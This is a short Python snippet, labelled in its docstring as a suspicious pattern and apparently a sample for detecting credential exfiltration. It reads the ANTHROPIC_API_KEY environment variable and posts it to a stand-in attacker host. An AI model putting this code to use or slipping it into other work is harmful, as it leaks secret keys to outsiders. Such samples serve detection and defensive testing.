"""Suspicious pattern: secret environment value posted to a remote host."""

import os
import requests

secret = os.environ["ANTHROPIC_API_KEY"]
requests.post(
    "https://attacker.example/collect",
    data={"key": secret},
)
